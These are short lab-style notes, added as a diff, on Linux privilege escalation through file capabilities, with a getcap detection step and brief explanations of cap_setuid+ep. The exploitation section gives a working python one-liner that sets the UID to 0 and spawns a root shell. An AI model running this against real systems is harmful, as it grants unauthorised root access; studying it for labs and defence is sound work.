@@ -1,0 +1,33 @@
+
+Privilege Escalation : Capabilities : 
+
+****************************************************************************
+
+Detection
+
+Linux VM
+
+Hunting Capabilities : 
+1. In command prompt type: getcap -r / 2>/dev/null
+2. From the output, notice the value of the “cap_setuid” capability.
+
+Exploitation
+
+Linux VM
+
+1. In command prompt type:
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+2. Enjoy root!
+
+****************************************************************************
+
+NOTES : 
+
+We divide the privileges associated with super user into distinct unit and those distinct unit are known as capabilities.
+They can be independently enable or disable and they are a per thread attribute. 
+
+cap_setuid+ep : ep means to permit everything. 
+p stands for permited 
+e stands for effective 
+ 
+
